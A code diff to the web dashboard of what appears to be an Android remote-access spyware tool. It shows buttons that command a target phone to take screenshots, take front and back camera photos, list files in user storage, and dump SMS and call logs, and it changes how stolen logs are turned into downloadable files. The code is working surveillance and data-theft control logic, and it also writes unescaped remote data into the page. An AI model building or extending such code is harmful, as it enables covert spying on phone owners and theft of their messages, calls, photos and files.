@@ -55,7 +55,7 @@ import Layout from '../layouts/Layout.astro';
             <button class="cmd-btn btn-primary" data-action="screenshot" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📸 Screenshot</button>
             <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "front"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">🤳 Front Photo</button>
             <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "back"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📸 Back Photo</button>
-            <button class="cmd-btn btn-primary" data-action="ls" data-extra='{"path": "/"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📁 List Files</button>
+            <button class="cmd-btn btn-primary" data-action="ls" data-extra='{"path": "/storage/emulated/0"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📁 List Files</button>
             <button class="cmd-btn btn-primary" data-action="sms" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">💬 SMS Logs</button>
             <button class="cmd-btn btn-primary" data-action="calls" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📞 Call Logs</button>
           </div>
@@ -325,7 +325,11 @@ import Layout from '../layouts/Layout.astro';
       } else if (data.file_base64) {
          area.innerHTML = `<a href="data:application/octet-stream;base64,${data.file_base64}" download="${data.filename}" style="color:var(--color-lime); font-weight: bold; padding: 12px; border: 1px solid var(--color-lime); border-radius: 8px; display: inline-block;">Download ${data.filename}</a>`;
       } else if (data.log_content) {
-         area.innerHTML = `<h4 style="color: var(--color-ink); margin-bottom: 12px;">${data.type} Logs</h4><pre style="white-space: pre-wrap; font-size: 13px; background: rgba(0,0,0,0.2); padding: 16px; border-radius: 8px; border: 1px solid var(--color-border); color: var(--color-ink); font-family: monospace;">${data.log_content}</pre>`;
+         const blob = new Blob([data.log_content], { type: 'text/plain' });
+         const url = URL.createObjectURL(blob);
+         const filename = `${data.type || 'log'}_${Date.now()}.txt`;
+         area.innerHTML = `<h4 style="color: var(--color-ink); margin-bottom: 12px;">${data.type || 'Log'} Files Ready</h4>
+         <a href="${url}" download="${filename}" style="color:var(--color-lime); font-weight: bold; padding: 12px; border: 1px solid var(--color-lime); border-radius: 8px; display: inline-block;">Download ${filename}</a>`;
       } else if (data.error) {
          area.innerHTML = `<p style="color: #ff4d4d; font-weight: 500; background: rgba(255, 77, 77, 0.1); padding: 12px; border-radius: 8px;">Error: ${data.error}</p>`;
       } else if (data.status) {
